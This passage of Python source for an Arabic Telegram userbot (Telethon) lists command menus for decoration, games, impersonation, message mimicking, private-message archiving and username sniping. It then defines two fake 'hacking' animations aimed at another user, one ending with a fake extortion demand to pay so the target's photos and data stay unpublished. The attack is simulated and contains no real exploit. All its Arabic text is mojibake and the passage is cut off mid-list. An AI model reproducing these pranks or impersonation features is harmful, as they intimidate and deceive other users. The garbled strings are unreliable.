 ‚Ä¢ `.ÿ¥ÿ®ÿßÿ®2`
‚ñ™Ô∏é ÿ®ÿπÿ∑ŸäŸÉ ÿ≤ÿÆÿßÿ±ŸÅ ÿ¥ÿ®ÿßÿ® 2
 
 ‚Ä¢ `.ÿ®ŸÜÿßÿ™1`
‚ñ™Ô∏é ÿ®ÿπÿ∑ŸäŸÉ ÿ≤ÿÆÿßÿ±ŸÅ ÿ®ŸÜÿßÿ™ 1
 
 ‚Ä¢ `.ÿ®ŸÜÿßÿ™2`
‚ñ™Ô∏é ÿ®ÿπÿ∑ŸäŸÉ ÿ≤ÿÆÿßÿ±ŸÅ ÿ®ŸÜÿßÿ™ 2
 
 ‚Ä¢ `.ÿßÿ≥ŸÖÿßÿ° ÿπÿ±ÿ®Ÿäÿ©`
‚ñ™Ô∏é ÿ®ÿπÿ∑ŸäŸÉ ÿ≤ÿÆÿßÿ±ŸÅ ÿßÿ≥ŸÖÿßÿ° ÿπÿ±ÿ®Ÿäÿ©

 ‚Ä¢ `.ÿßÿ¥Ÿáÿ± ŸÖÿ≤ÿ∫ÿ±ŸÅ`
‚ñ™Ô∏é ÿ®ÿπÿ∑ŸäŸÉ ÿ≤ÿÆÿßÿ±ŸÅ ÿßÿ≥ŸÖÿßÿ° ÿßŸÑÿ£ÿ¥Ÿáÿ± ŸÖÿ≤ÿÆÿ±ŸÅŸá 
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m19_text)
    
@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ20'))
async def show_m20_commands(event):
    m20_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßÿ∂ÿßŸÅŸäŸá[‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `ŸÉÿ™ÿßÿ®ÿ© `+ ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä 
 = ŸÑÿ£ÿ∂Ÿáÿßÿ± ŸÉŸÑŸÖÿ© ŸäŸÉÿ™ÿ® .. ÿ®ÿ¥ŸÉŸÑ ŸàŸáŸÖŸä

 ‚Ä¢ `ŸÅŸäÿØ` + ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä 
 = ŸÑÿ£ÿ∏Ÿáÿßÿ± ÿ®ÿ£ŸÜŸÉ ÿ™ÿ±ÿ≥ŸÑ ŸÅŸäÿØŸäŸà ŸÅŸä ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿßŸà ÿßŸÑÿÆÿßÿµ

 ‚Ä¢ `ŸÑÿπÿ®ÿ©` + ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä 
 = ŸÑÿ•ÿ∏Ÿáÿßÿ± ÿ®ÿ£ŸÜŸÉ ÿ™ŸÑÿπÿ® 

 ‚Ä¢ `ÿµŸàÿ™Ÿäÿ©` + ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä 
 = ŸÑÿ£ÿ∏Ÿáÿßÿ± ÿ®ÿ£ŸÜŸÉ ÿ™ÿ≥ÿ¨ŸÑ ÿ®ÿµŸÖÿ©
 ‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
 ·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m20_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ21'))
async def show_m21_commands(event):
    m21_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± 2 ÿßŸÑÿ™ÿ≥ŸÑŸäŸá [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ®ŸÜÿ¨`
‚ñ™Ô∏é Ÿäÿπÿ±ÿ∂ ŸÑŸÉ ÿ≥ÿ±ÿπŸá ŸÜÿ™ŸÉ 

 ‚Ä¢ `.ÿßŸÜŸÖŸä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿä ÿßŸÜÿ¥ÿßÿ° ÿµŸàÿ± ÿßŸÑÿßŸÜŸÖŸä 

 ‚Ä¢ `.ÿ®ŸÑŸä`
‚ñ™Ô∏é ÿπÿ®ÿßÿ±Ÿá ÿπŸÜ ÿßŸÑÿπÿßÿ® 

 ‚Ä¢ `.ŸÉÿ™`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿä ÿßÿπÿ∑ÿßŸÉ ÿßÿ≥ÿßŸÑÿ© 

 ‚Ä¢ `.ÿπŸÉÿ≥`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπŸÉÿ≥ ÿßŸÑŸÉŸÑÿßŸÖ ÿ®ÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÉŸÑÿßŸÖ

 ‚Ä¢ `.ÿÆŸäÿ±ŸàŸÉ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ÿπÿ∑ÿßÿ° ÿÆŸäÿßÿ±ÿßÿ™ ÿßÿ≥ÿßŸÑŸá 

 ‚Ä¢ `.ÿßŸÉÿ≥ ÿßŸà`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ŸÑÿπÿ®Ÿá XO

 ‚Ä¢ `.ŸÉÿ±ÿ©`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ŸÑÿπÿ®Ÿá ÿßŸÑŸÉÿ±ÿ© 

 ‚Ä¢ `.ÿ≥ŸÑŸá`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ŸÑÿπÿ®Ÿá ÿßŸÑÿ≥ŸÑŸá

 ‚Ä¢ `.ŸÜÿ±ÿØ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ŸÑÿπÿ®Ÿá ÿßŸÑŸÜÿ±ÿØ

 ‚Ä¢ `.ÿ≠ÿ∏`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ŸÑÿπÿ®Ÿá ÿßŸÑÿ≠ÿ∏

 ‚Ä¢ `.ÿ≥ŸáŸÖ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ŸÑÿπÿ®Ÿá ÿßŸÑÿ≥ŸáŸÖ
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m21_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ22'))
async def show_m22_commands(event):
    m22_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ®ÿµŸÖÿßÿ™ [‚òÖ]‚îÅ‚îÅ‚îÅ>
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿ∫ŸÜŸäŸÑŸä`. Ô∏é 
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿ¥ÿπÿ±`   Ô∏é  
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ŸÇÿ±ÿßŸÜ`.   
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿ≤Ÿäÿ¨ ÿ≠ÿ≤ŸäŸÜ`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ŸäÿπŸÜŸä ŸáŸÑ ÿÆÿ±Ÿá`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ŸÑŸàŸÉŸä ÿ¥ÿØÿÆŸÑŸÉ`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿßŸÑŸâ ŸÖÿ™Ÿâ`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿßÿ≠ÿ∑ ÿ±ÿ¨ŸÑŸä`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿ™ÿ®ÿß`
‚Ä¢ Ô∏éÿßŸÑÿ®ÿµŸÖÿ© : `.ÿßŸÉŸÑ ÿÆÿ±ÿß`
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m22_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ23'))
async def show_m23_commands(event):
    m23_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ŸÇŸÑŸäÿØ ŸàÿßŸÑÿßŸÜÿ™ÿ≠ÿßŸÑ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ŸÜÿ¥ÿßÿ° ŸÉÿ±Ÿàÿ® Ÿàÿ™ÿÆÿ≤ŸäŸÜ ÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿÆÿßÿµ ŸàÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ 

 ‚Ä¢ `.ÿßŸÜÿ™ÿ≠ÿßŸÑ | ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ©`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿßŸÜÿ™ÿ≠ÿßŸÑ ÿßŸÑÿ¥ÿÆÿµ

 ‚Ä¢ `.ÿßÿ±ÿ¨ÿßÿπ`
‚ñ™Ô∏é Ÿäÿ±ÿ¨ÿπ ÿ≠ÿ≥ÿßŸäŸÉ ŸÑŸàÿ∂ÿπ ÿßŸÑÿ∑ÿ®ŸäÿπŸä 

 ‚Ä¢ `.ÿ™ŸÇŸÑŸäÿØ | ÿ®ÿßŸÑÿ±ÿØ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ŸÇŸäÿØ ÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿ¥ÿÆÿµ 

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ŸÇŸÑŸäÿØ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ŸäŸÇÿßŸÅ ÿ™ŸÇŸÑŸäÿØ ÿßŸÑÿ¥ÿÆÿµ
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m23_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ24'))
async def show_m24_commands(event):
    m24_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ÿ≠ÿ¥Ÿäÿ¥ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ±ŸÅÿπ ŸÖÿ±ÿ™Ÿä`
 ‚Ä¢ `.ÿ±ŸÅÿπ ÿ¨ŸÑÿ®`
 ‚Ä¢ `.ÿ≤Ÿàÿßÿ¨`
 ‚Ä¢ `.ÿ∑ŸÑÿßŸÉ`

 ‚Ä¢ `.Ô∏éŸÜÿ≥ÿ®ÿ© + ÿßŸä ŸÉŸÑŸÖÿ©`
‚ñ™Ô∏é ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ¥ÿÆÿµ 

 ‚Ä¢ `.ŸÜÿ≥ÿ®ÿ™ŸÜÿß + ÿßŸä ŸÉŸÑŸÖÿ©`

 ‚Ä¢ `.Ô∏éÿ®Ÿàÿ≥ÿ© | .ŸáŸäŸÜÿ©`
‚ñ™Ô∏é ÿ®ÿßŸÑÿ±ÿØ ÿ®ÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ¥ÿÆÿµ 

 ‚Ä¢ `ÿ±ŸÅÿπ + ÿßŸä ŸÉŸÑŸÖÿ©`

 ‚Ä¢ `.ŸÖŸÇÿßÿ±ŸÜÿ©`
‚ñ™Ô∏é ÿ®ÿßŸÑÿ±ÿØ ÿ®ÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ¥ÿÆÿµ 
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m24_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ25'))
async def show_m25_commands(event):
    m25_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿµŸäÿØ ŸäŸàÿ≤ÿ±ÿßÿ™ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿµŸäÿØ + ÿßŸÑŸÜŸÄŸàÿπ`
‚™º ŸÑŸÄ ÿµŸäŸÄÿØ ŸäŸÄŸàÿ≤ÿ±ÿßÿ™ ÿπÿ¥Ÿàÿßÿ¶ŸäŸÄŸá ÿπŸÑŸâ ÿ≠ÿ≥ÿ® ÿßŸÑŸÜŸÄŸàÿπ

 ‚Ä¢ `.ÿ≠ÿßŸÑÿ© ÿßŸÑÿµŸäÿØ`
‚™º ŸÑŸÄ ŸÖÿπÿ±ŸÅŸÄÿ© ÿ≠ÿßŸÑŸÄÿ© ÿ™ŸÇŸÄÿØŸÖ ÿπŸÖŸÑŸäŸÄÿ© ÿßŸÑÿµŸäŸÄÿØ

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿµŸäÿØ`
‚™º ŸÑŸÄ ÿ•ŸäŸÇŸÄÿßŸÅ ÿπŸÖŸÑŸäŸÄÿ© ÿßŸÑÿµŸäŸÄÿØ ÿßŸÑÿ¨ÿßÿ±ŸäŸÄŸá

 ‚Ä¢ `.ŸÜŸàÿπ`
‚™º ŸÑŸÄ ÿπŸÄÿ±ÿ∂ ÿßŸÑÿßŸÜŸÄŸàÿπ ÿßŸÑÿ™Ÿä ŸäŸÖŸÉŸÄŸÜ ÿµŸäÿØŸáŸÄÿß ŸÖÿπ ÿßŸÑÿßŸÖÿ´ŸÄŸÑŸá
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m25_text)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ26'))
async def show_m26_commands(event):
    m26_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ÿ´ÿ®Ÿäÿ™ [‚òÖ]‚îÅ‚îÅ‚îÅ>
‚éô ‚Ä¢ `.ÿ™ÿ´ÿ®Ÿäÿ™ ŸÑÿ≥ÿ™ÿ©`

Ÿäÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿßŸÖÿ± ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ŸäŸàÿ≤ÿ± Ÿàÿßÿ≠ÿØ ÿßŸà ÿπÿØÿ© ŸäŸàÿ≤ÿ±ÿßÿ™ 
ŸÑŸÅÿ≠ÿµ ÿßŸÑŸäŸàÿ≤ÿ±ÿßÿ™ ÿßŸÑÿ™Ÿä ÿ≠ÿØÿØÿ™Ÿáÿß ŸÅŸÇÿ∑ ÿ≥ŸäÿßÿÆÿ∞Ÿáÿß ŸÅŸä ÿ≠ÿßŸÑ ÿßÿµÿ®ÿ≠ÿ™ ŸÖÿ™ÿßÿ≠ÿ© 

‚éô ‚Ä¢ `.ÿ≠ÿßŸÑÿ© ÿßŸÑÿ™ÿ´ÿ®Ÿäÿ™  | .ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ´ÿ®Ÿäÿ™`  
ŸÑŸÖÿπÿ±ŸÅÿ© ÿßŸÑÿ≠ÿßŸÑÿ© ÿßŸà ÿßŸÑÿßŸäŸÇÿßŸÅ
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m26_text)    
    
async def fake_hack(client, event):
    """ÿπÿ±ÿ∂ ÿ£ŸÜŸäŸÖŸäÿ¥ŸÜ ÿßÿÆÿ™ÿ±ÿßŸÇ ŸàŸáŸÖŸä ÿπŸÜÿØ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ©"""
    if event.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        idd = reply_message.sender_id

        if idd == 6383191007:
            await event.edit("**·ØΩÔ∏ô ÿπŸÄÿ∞ÿ±ÿß ŸÑÿß ÿßÿ≥ÿ™ŸÄÿ∑Ÿäÿπ ÿßÿÆŸÄÿ™ÿ±ÿßŸÇ ŸÖŸÄÿ∑Ÿàÿ±Ÿä ÿßÿπŸÄÿ™ÿ∞ÿ± ÿßŸà ÿ≥ŸäŸÇŸÄŸàŸÖ ÿ®ÿ™ŸáŸÄŸÉŸäÿ±ŸÉ**")
            return
        
        event = await event.edit("Ÿäÿ™ŸÄŸÖ ÿßŸÑÿßÿÆÿ™ŸÄÿ±ÿßŸÇ ..")

        me = await client.get_me()  
        animation_chars = [
            "·ØΩÔ∏ô ÿ™ŸÄŸÖ ÿßŸÑÿ±ÿ®ŸÄÿ∑ ÿ®ÿ≥ŸÄŸäÿ±ŸÅÿ±ÿßÿ™ ÿßŸÑŸÄÿ™ŸáŸÉŸäÿ± ÿßŸÑÿÆŸÄÿßÿµÿ©",
            "ÿ™ŸÄŸÖ ÿ™ÿ≠ŸÄÿØŸäÿØ ÿßŸÑÿ∂ÿ≠ŸÄŸäÿ©",
            "**ÿ™ŸáŸÉŸäŸÄÿ±**... 0%\n‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí ",
            "**ÿ™ŸáŸÉŸäŸÄÿ±**... 4%\n‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí ",
            "**ÿ™ŸáŸÉŸäŸÄÿ±**... 8%\n‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí ",
            "**ÿ™ŸáŸÉŸäŸÄÿ±**... 20%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí ",
            "**ÿ™ŸáŸÉŸäŸÄÿ±**... 36%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí ",
            "**ÿ™ŸáŸÉŸäŸÄÿ±**... 52%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí ",
            "**ÿ™ŸáŸÉŸäŸÄÿ±**... 84%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí ",
            "**ÿ™ŸáŸÉŸäŸÄÿ±**... 100%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ",
            f"·ØΩÔ∏ô ** ÿ™ŸÄŸÖ ÿßÿÆŸÄÿ™ÿ±ÿßŸÇ ÿßŸÑÿ∂ŸÄÿ≠Ÿäÿ©**..\n\nŸÇŸÄŸÖ ÿ®ÿßŸÑŸÄÿØŸÅÿπ ÿßŸÑŸâ {me.first_name} ŸÑÿπŸÄÿØŸÖ ŸÜÿ¥ŸÄÿ± ŸÖÿπŸÑŸàŸÖÿßÿ™ŸÉ ŸàÿµŸÄŸàÿ±ŸÉ",
        ]
        
        for i in range(len(animation_chars)):
            await asyncio.sleep(3)
            await event.edit(animation_chars[i])
    else:
        await event.edit("·ØΩÔ∏ô ŸÑŸÖ Ÿäÿ™ŸÄŸÖ ÿßŸÑÿ™ÿπŸÄÿ±ŸÅ ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ŸÄÿÆÿØŸÖ")

@client.on(events.NewMessage(pattern=".ÿ™ŸáŸÉŸäÿ±$"))
async def _(event):
    await fake_hack(client, event)

async def fake_hack2(client, event):
    """ÿπÿ±ÿ∂ ÿ£ŸÜŸäŸÖŸäÿ¥ŸÜ ÿßÿÆÿ™ÿ±ÿßŸÇ ŸàŸáŸÖŸä ŸÖÿπ ÿ•ÿ∏Ÿáÿßÿ± ÿßÿ≥ŸÖ ÿßŸÑŸÖŸáÿßÿ¨ŸÖ"""
    animation_interval = 3

    await event.edit("**ÿ¨ÿßÿ±Ÿê ÿßÿÆÿ™ÿ±ÿßŸÇ ÿßŸÑÿ∂ÿ≠Ÿäÿ©..**")

    animation_chars = [
        "**ÿ¨ÿßÿ± ÿ™ÿ≠ÿØŸäÿØ ÿßŸÑÿ∂ÿ≠Ÿäÿ©...**",
        "**ÿ™ŸÖ ÿ™ÿ≠ÿØŸäÿØ ÿßŸÑÿ∂ÿ≠Ÿäÿ© ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**",
        "`Ÿäÿ™ŸÖ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ... 0%\n‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí `",
        "`Ÿäÿ™ŸÖ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ... 4%\n‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí `",
        "`Ÿäÿ™ŸÖ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ... 8%\n‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí `",    
        "`Ÿäÿ™ŸÖ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ... 20%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí `",
        "`Ÿäÿ™ŸÖ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ... 36%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí `",
        "`Ÿäÿ™ŸÖ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ... 52%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí `",
        "`Ÿäÿ™ŸÖ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ... 84%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí `",
        "`Ÿäÿ™ŸÖ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ... 100%\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà `",
    ]
  
    for i in range(len(animation_chars)):
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i])

    
    me = await client.get_me()
    attacker_name = me.first_name


    final_message = f"**ÿ™ŸÖ ÿ±ŸÅÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ∂ÿ≠Ÿäÿ©...**\n\n**ÿßŸÑŸÖÿÆÿ™ÿ±ŸÇ:** {attacker_name}\nÿ≥Ÿäÿ™ŸÖ ÿ±ÿ®ÿ∑ ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™ ÿ®ÿ≥Ÿäÿ±ŸÅÿ±ÿßÿ™ ÿßŸÑÿ™ŸáŸÉŸäÿ± ÿßŸÑÿÆÿßÿµÿ©.."
    await asyncio.sleep(2)
    await event.edit(final_message)


@client.on(events.NewMessage(pattern=".ÿßÿÆÿ™ÿ±ÿßŸÇ$"))
async def _(event):
    await fake_hack2(client, event)

@client.on(events.NewMessage(from_users='me', pattern='.ÿ∫ÿ®Ÿä'))
async def dumb_brain(event):
    try:
        
        await event.delete()

        
        message_texts = [
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß†         <(^_^ <)üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß†       <(^_^ <)  üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß†     <(^_^ <)  üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß†   <(^_^ <)  üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\nüß† <(^_^ <)  üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n  (> ^_^)>üß†       üóë",
